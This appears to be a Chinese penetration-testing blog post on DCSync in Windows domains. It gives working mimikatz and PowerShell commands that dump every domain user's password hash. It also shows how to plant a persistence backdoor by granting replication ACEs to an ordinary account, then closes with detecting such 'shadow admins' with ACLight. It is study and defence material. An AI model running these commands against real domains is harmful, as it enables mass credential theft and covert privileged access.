@@ -1,0 +1,244 @@
+I"�&<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>DCSync是域渗透中经常会用到的技术，本文会对开源的资料进行整理，结合自己的经验，总结利用和防御检测的方法</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>利用DCSync导出域内所有用户hash的方法</li>
+  <li>利用DCSync在域内维持权限的方法</li>
+  <li>自动化检测DCSync后门的方法</li>
+</ul>
+
+<h2 id="0x02-利用dcsync导出域内所有用户hash的方法">0x02 利用DCSync导出域内所有用户hash的方法</h2>
+<hr />
+
+<p>DCSync是mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，能够用来导出域内所有用户的hash</p>
+
+<p><strong>利用条件：</strong></p>
+
+<p>获得以下任一用户的权限：</p>
+
+<ul>
+  <li>Administrators组内的用户</li>
+  <li>Domain Admins组内的用户</li>
+  <li>Enterprise Admins组内的用户</li>
+  <li>域控制器的计算机帐户</li>
+</ul>
+
+<p><strong>利用原理：</strong></p>
+
+<p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据</p>
+
+<p>参考资料：
+https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47</p>
+
+<p><strong>实现代码：</strong></p>
+
+<p>https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/lsadump/kuhl_m_lsadump_dc.c#L27</p>
+
+<p><strong>利用方法：</strong></p>
+
+<h4 id="1使用mimikatz">1.使用mimikatz</h4>
+
+<p>导出域内所有用户的hash：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /all /csv" exit
+</code></pre></div></div>
+
+<p>导出域内administrator帐户的hash：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
+</code></pre></div></div>
+
+<h4 id="2powershell实现">2.powershell实现</h4>
+
+<p>https://gist.github.com/monoxgas/9d238accd969550136db</p>
+
+<p>通过Invoke-ReflectivePEinjection调用mimikatz.dll中的dcsync功能</p>
+
+<p>导出域内所有用户的hash：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DCSync -DumpForest | ft -wrap -autosize
+</code></pre></div></div>
+
+<p>导出域内administrator帐户的hash：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-DCSync -DumpForest -Users @("administrator") | ft -wrap -autosize
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>获得了域内用户的hash后，进一步利用可参考之前的文章：</p>
+
+<p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Pass-The-Hash%E7%9A%84%E5%AE%9E%E7%8E%B0">《域渗透——Pass The Hash的实现》</a></p>
+
+<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Pass-the-Hash-with-Remote-Desktop(Restricted-Admin-mode)">《渗透技巧——Pass the Hash with Remote Desktop(Restricted Admin mode)》</a></p>
+
+<p>《域渗透——Pass The Hash &amp; Pass The Key》</p>
+
+<h2 id="0x03-利用dcsync在域内维持权限的方法">0x03 利用DCSync在域内维持权限的方法</h2>
+<hr />
+
+<p><strong>利用条件：</strong></p>
+
+<p>获得以下任一用户的权限：</p>
+
+<ul>
+  <li>Domain Admins组内的用户</li>
+  <li>Enterprise Admins组内的用户</li>
+</ul>
+
+<p><strong>利用原理：</strong></p>
+
+<p>向域内的一个普通用户添加如下三条ACE(Access Control Entries)：</p>
+
+<ul>
+  <li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
+  <li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
+  <li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li>
+</ul>
+
+<p>该用户即可获得利用DCSync导出域内所有用户hash的权限</p>
+
+<p><strong>实现代码：</strong></p>
+
+<p>https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1#L8270</p>
+
+<p><strong>利用方法：</strong></p>
+
+<p>添加ACE的命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync -Verbose
+</code></pre></div></div>
+
+<p><strong>补充：</strong></p>
+
+<p>删除ACE的命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Remove-DomainObjectAcl -TargetIdentity "DC=test,DC=com" -PrincipalIdentity test1 -Rights DCSync -Verbose
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>关于更多ACL的内容可参考之前的文章：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E4%B8%8B%E7%9A%84Access-Control-List">《渗透技巧——Windows下的Access Control List》</a></p>
+
+<p>使用域用户test1调用DCSync的方法如下：</p>
+
+<h4 id="1在域内一台登录了test1用户的主机上面直接使用mimikatz的dcsync功能">1.在域内一台登录了test1用户的主机上面，直接使用mimikatz的DCSync功能</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
+</code></pre></div></div>
+
+<h4 id="2使用runas实现登录test1用户再使用dcsync">2.使用runas实现登录test1用户，再使用DCSync</h4>
+
+<p>(1)弹出cmd</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /noprofile /user:test\test1 cmd
+</code></pre></div></div>
+
+<p>弹出的cmd下执行如下命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /all /csv" exit
+</code></pre></div></div>
+
+<p>(2)不弹框实现</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo 123456789 | runas /noprofile /user:test\test1 c:\test\1.bat
+</code></pre></div></div>
+
+<p>1.bat的内容如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\test\mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit&gt;c:\test\1.txt
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>同类的工具还有lsrunas、lsrunase和CPAU</p>
+
+<h4 id="3使用powershell实现登录test1用户再使用dcsync">3.使用powershell实现登录test1用户，再使用DCSync</h4>
+
+<p>(1)弹出cmd</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="test\test1"                                                      
+$pwd=ConvertTo-SecureString "12345678" -AsPlainText –Force                   
+$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
+Start-Process -FilePath "cmd.exe" -Credential $cred  
+</code></pre></div></div>
+
+<p>弹出的cmd下执行如下命令：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit
+</code></pre></div></div>
+
+<p>(2)不弹框实现</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$uname="test\test1"                                                      
+$pwd=ConvertTo-SecureString "12345678" -AsPlainText –Force                   
+$cred=New-Object System.Management.Automation.PSCredential($uname,$pwd)        
+Start-Process -FilePath "c:\test\1.bat" -Credential $cred
+</code></pre></div></div>
+
+<p>1.bat的内容如下:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c:\test\mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.com /user:administrator /csv" exit&gt;c:\test\1.txt
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>使用wmic在本机实现登录用户test1会失败，错误如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ERROR:
+Description = User credentials cannot be used for local connections
+</code></pre></div></div>
+
+<h2 id="0x04-自动化检测dcsync后门的方法">0x04 自动化检测DCSync后门的方法</h2>
+<hr />
+
+<p>具有高权限但不在高权限组的用户被称之为Shadow Admin，例如0x03中的域用户test1，仅通过查询高权限组的成员无法发现域内的Shadow Admin</p>
+
+<p><strong>检测原理：</strong></p>
+
+<p>枚举Active Directory中所有用户的ACL，标记出特权帐户</p>
+
+<p><strong>实现代码：</strong></p>
+
+<p>https://github.com/cyberark/ACLight</p>
+
+<p><strong>利用条件：</strong></p>
+
+<ul>
+  <li>Powershell v3.0</li>
+  <li>域内普通用户权限</li>
+</ul>
+
+<p><strong>检测方法：</strong></p>
+
+<p>执行项目中的Execute-ACLight2.bat</p>
+
+<p>生成三个文件：</p>
+
+<ul>
+  <li>Privileged Accounts - Layers Analysis.txt</li>
+  <li>Privileged Accounts Permissions - Final Report.csv</li>
+  <li>Privileged Accounts Permissions - Irregular Accounts.csv</li>
+</ul>
+
+<p>文件中会显示出所有特权帐户</p>
+
+<p>经测试，ACLight能够检测出被添加DCSync权限的用户test1</p>
+
+<h2 id="0x05-小结">0x05 小结</h2>
+<hr />
+
+<p>本文介绍了域渗透中DCSync的利用和自动化检测的方法，站在防御的角度，建议使用ACLight对域环境的用户ACL进行检测</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
